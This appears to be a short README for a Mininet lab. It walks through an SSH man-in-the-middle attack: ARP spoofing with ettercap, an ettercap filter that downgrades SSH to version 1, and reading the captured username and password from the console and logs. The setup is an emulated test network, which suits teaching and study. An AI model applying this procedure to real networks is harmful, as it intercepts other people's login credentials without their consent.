# mininet_sshmitm
1. Install Mininet
2. Run sshmitm.py
3. xterm h1 h2 h3
4. [h3]: echo 1 > /proc/sys/net/ipv4/ip_forward, cat /proc/sys/net/ipv4/ip_forward
5. [h3]: ettercap -G --filter etter_filter_ssh_co
6. Check option only checks 'Promisc Mode'
7. Sniffing -> Unified Sniffing -> h3-eth0
8. Hosts->Scan for Hosts
9. Hosts -> Host List -> 192.168.0.3 Add to target 1, 192.168.0.4 Add to target 2.
10. Check. Targets -> Current Targets
11. Mitm -> ARP Spoofing -> Sniff Remote Connections check -> Press OK, Check log for group
12. Start -> Start Sniffing
13. h1: ssh -1 mininet@192.168.0.4
14. If 'WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!' shows, ssh-keygen -f "/root/.ssh/known_hosts" -R 192.168.0.4
retry
15. See both '[SSH Filter] SSH downgraded from version 2 to 1' and 'SSH : 192.168.0.4:22 -> USER: mininet  PASS: mininet' in the ettercap conole
16. Any decoded will be in decoded.log, and undecoded in logfile.log. Tail -f in decoded.log to see the updates
